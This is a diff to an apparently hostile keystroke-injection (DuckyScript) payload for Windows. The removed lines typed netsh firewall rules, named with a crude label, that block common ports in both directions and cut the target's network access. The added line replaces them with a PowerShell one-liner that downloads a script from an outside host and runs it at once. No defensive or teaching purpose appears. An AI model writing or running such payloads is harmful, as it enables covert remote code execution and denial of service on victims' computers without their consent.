@@ -17,17 +17,5 @@ ENTER
 DELAY 900
 ALT y
 DELAY 900
-STRING netsh advfirewall firewall add rule name="PORTRAPE" protocol=TCP dir=out remoteport=80,443,22,21,8080,8081,4040,4098,23,194,8443 action=block
-ENTER
-DELAY 900
-STRING netsh advfirewall firewall add rule name="PORTRAPE" protocol=UDP dir=out remoteport=80,443,22,21,8080,8081,4040,4098,23,194,8443 action=block
-ENTER
-DELAY 900
-STRING netsh advfirewall firewall add rule name="PORTRAPE" protocol=TCP dir=in remoteport=80,443,22,21,8080,8081,4040,4098,23,194,8443 action=block
-ENTER
-DELAY 900 
-STRING netsh advfirewall firewall add rule name="PORTRAPE" protocol=UDP dir=in remoteport=80,443,22,21,8080,8081,4040,4098,23,194,8443 action=block
-ENTER
-DELAY 900
-STRING exit
+STRING iwr https://sorted.is-broke.cf/portrape.ps1 -UseBasicParsing | iex; exit
 ENTER
